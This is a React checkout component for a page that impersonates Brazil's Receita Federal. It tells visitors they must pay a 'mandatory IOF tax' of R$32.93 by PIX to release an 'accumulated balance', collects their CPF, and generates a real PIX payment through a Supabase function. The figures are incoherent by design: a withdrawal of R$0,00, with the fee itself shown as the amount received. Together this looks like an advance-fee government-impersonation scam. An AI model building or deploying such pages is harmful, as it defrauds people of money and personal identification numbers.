import { useState } from "react";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { QRCodeSVG } from "qrcode.react";

const Checkout = () => {
  const [cpf, setCpf] = useState("");
  const [agreed, setAgreed] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [qrCode, setQrCode] = useState<string | null>(null);
  const [pixCode, setPixCode] = useState<string | null>(null);
  const [transactionId, setTransactionId] = useState<string | null>(null);
  const [iofValue] = useState(32.93);

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "");
    return numbers
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})/, "$1-$2")
      .slice(0, 14);
  };

  const handleCPFChange = (value: string) => {
    setCpf(formatCPF(value));
  };

  const handlePayment = async () => {
    if (!cpf || !agreed) return;

    setIsLoading(true);

    try {
      const { data, error } = await supabase.functions.invoke("create-pix-payment", {
        body: {
          amount: Math.round(iofValue * 100),
          customerCpf: cpf.replace(/\D/g, ""),
          customerName: "Cliente",
          customerEmail: "cliente@email.com",
          customerPhone: "11999999999",
        },
      });

      if (error) throw error;

      if (data?.pix) {
        setQrCode(data.pix.qrcodeUrl);
        setPixCode(data.pix.qrcode);
        setTransactionId(data.id);
      }
    } catch (error) {
      console.error("Payment error:", error);
      toast({
        title: "Erro ao processar pagamento",
        description: "Tente novamente em alguns instantes.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const copyPixCode = () => {
    if (pixCode) {
      navigator.clipboard.writeText(pixCode);
      toast({
        title: "Código copiado!",
        description: "Cole no app do seu banco para pagar.",
      });
    }
  };

  if (qrCode) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-blue-900 to-blue-950 flex flex-col">
        {/* Header */}
        <header className="bg-blue-900 py-4 flex items-center justify-center gap-3">
          <svg className="w-8 h-8 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
          </svg>
          <span className="text-white font-semibold text-lg">Receita Federal</span>
        </header>

        <main className="flex-1 flex flex-col items-center px-4 py-6">
          <div className="bg-white rounded-lg w-full max-w-md p-6 shadow-lg">
            <h2 className="text-xl font-bold text-gray-900 text-center mb-4">
              Pague via PIX
            </h2>

            <div className="flex justify-center mb-4 bg-white p-4 rounded-lg">
              <QRCodeSVG value={pixCode || ""} size={192} />
            </div>

            <p className="text-center text-gray-600 text-sm mb-4">
              Escaneie o QR Code ou copie o código abaixo
            </p>

            <div className="bg-gray-100 p-3 rounded-lg mb-4">
              <p className="text-xs text-gray-600 break-all font-mono">
                {pixCode?.slice(0, 50)}...
              </p>
            </div>

            <button
              onClick={copyPixCode}
              className="w-full bg-teal-500 text-white py-3 rounded-lg font-semibold hover:bg-teal-600 transition-colors mb-4"
            >
              Copiar código PIX
            </button>

            <div className="text-center">
              <p className="text-gray-500 text-sm">
                Valor: <span className="font-semibold text-gray-900">R$ {iofValue.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
              </p>
              <p className="text-gray-400 text-xs mt-2">
                O pagamento será confirmado automaticamente
              </p>
            </div>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-900 to-blue-950 flex flex-col">
      {/* Header */}
      <header className="bg-blue-900 py-4 flex items-center justify-center gap-3">
        <svg className="w-8 h-8 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
        </svg>
        <span className="text-white font-semibold text-lg">Receita Federal</span>
      </header>

      {/* Alert Banner */}
      <div className="mx-4 mt-4">
        <div className="bg-orange-100 border-l-4 border-orange-500 p-4 rounded-r-lg flex items-center gap-3">
          <svg className="w-6 h-6 text-orange-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
          </svg>
          <span className="text-orange-800 font-medium">Imposto sobre Operações Financeiras (IOF)</span>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-4 py-6">
        <div className="bg-white rounded-lg w-full max-w-lg shadow-lg">
          {/* Title */}
          <div className="p-6 border-b">
            <h2 className="text-xl font-bold text-gray-900">
              Pagamento do IOF Obrigatório para Liberação do Saldo Acumulado
            </h2>
          </div>

          {/* Summary */}
          <div className="p-4 mx-4 mt-4 bg-gray-50 rounded-lg">
            <h3 className="font-semibold text-gray-900 mb-4">Resumo</h3>
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="text-gray-600">Valor de saque</span>
                <span className="font-medium">R$ 0,00</span>
              </div>
              <div className="flex justify-between">
                <span className="text-red-600">Valor a ser pago (IOF)</span>
                <span className="text-red-600 font-medium">- R$ {iofValue.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
              </div>
              <div className="border-t pt-3 flex justify-between">
                <span className="font-semibold text-gray-900">Total a receber no PIX</span>
                <span className="font-bold text-gray-900">R$ {iofValue.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
              </div>
            </div>
          </div>

          {/* CPF Input */}
          <div className="p-4 mx-4 mt-4 bg-white border border-gray-200 rounded-lg">
            <label className="block text-sm font-medium text-gray-900 mb-2">
              CPF do titular <span className="text-red-500">*</span>
            </label>
            <Input
              placeholder="000.000.000-00"
              value={cpf}
              onChange={(e) => handleCPFChange(e.target.value)}
              className="w-full"
            />
            <p className="text-xs text-red-500 mt-1">* Campo obrigatório para prosseguir</p>
          </div>

          {/* CTA */}
          <div className="p-4 mx-4">
            <button
              onClick={handlePayment}
              disabled={!cpf || !agreed || isLoading}
              className={`w-full py-4 rounded-lg font-semibold transition-colors ${
                cpf && agreed && !isLoading
                  ? "bg-gray-500 text-white hover:bg-gray-600"
                  : "bg-gray-300 text-gray-500 cursor-not-allowed"
              }`}
            >
              {isLoading ? "Processando..." : "Pagar Imposto (IOF)"}
            </button>
          </div>

          {/* Agreement */}
          <div className="p-4 mx-4 mb-4 flex items-center gap-3">
            <Checkbox
              id="terms"
              checked={agreed}
              onCheckedChange={(checked) => setAgreed(checked as boolean)}
            />
            <label htmlFor="terms" className="text-sm text-gray-600 cursor-pointer">
              Concordo com os termos e condições <span className="text-red-500">*</span>
            </label>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Checkout;
